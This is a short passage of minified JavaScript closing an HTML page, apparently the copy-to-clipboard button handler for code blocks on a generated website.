n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>